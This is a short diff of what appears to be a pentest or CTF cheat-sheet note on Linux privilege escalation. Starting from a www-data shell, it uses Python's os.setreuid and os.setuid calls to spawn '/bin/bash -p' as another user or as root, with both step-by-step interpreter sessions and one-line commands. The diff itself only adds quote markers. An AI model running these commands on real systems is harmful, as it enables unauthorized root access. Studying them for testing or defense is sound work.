@@ -21,7 +21,7 @@ current setup:
   uid user: 33 (www-data)
 
 rough idea how it works executing step by step:
-
+'''
 $python
 
 \>\>import os
@@ -29,7 +29,7 @@ $python
 \>\>os.setreuid(1000,1000)	#setreuid(ruid,euid)
 
 \>\>os.system("/bin/bash -p")
-
+'''
 one line command:
 >python -c 'import os;os.setreuid(1001,1001);os.system("/bin/bash -p")'
 
@@ -41,13 +41,13 @@ one line command:
 rough idea how it works executing step by step:
 
 #python
-
+'''
 \>\>import os
 
 \>\>os.setuid(0)
 
 \>\>os.system("/bin/bash -p")
-
+'''
 one line command:
 >python -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
 
